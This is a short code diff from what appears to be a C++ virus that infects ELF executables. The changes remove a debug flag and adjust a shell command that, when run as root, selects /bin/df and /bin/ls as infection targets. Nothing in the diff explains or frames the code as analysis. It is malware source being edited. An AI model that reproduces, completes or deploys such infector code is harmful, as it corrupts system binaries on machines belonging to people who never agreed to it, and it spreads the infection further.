@@ -4,7 +4,6 @@
 
 const char* IDENTIFIER = "PROBOTEST";
 const int MYSIZE = 19524;
-const bool DEBUG_SHELL = false;
 
 using namespace std;
 
@@ -48,12 +47,9 @@ int main (int argc, char** argv) {
         command = "VIR=$(for n in `find ";
         if (uid == 0) command += "/bin/ ";
         command += "-mindepth 1 -maxdepth 1 -type f";
-        if (uid == 0) {
-            command += " | egrep '\
+        if (uid == 0) command += " | egrep '\
 ^/bin/df$|\
-^/bin/ls$|";
-            if (DEBUG_SHELL) command += "^/bin/ps$'";
-        }
+^/bin/ls$'";
         command += "`; \
 do \
 file $n | grep -q ELF && ( \
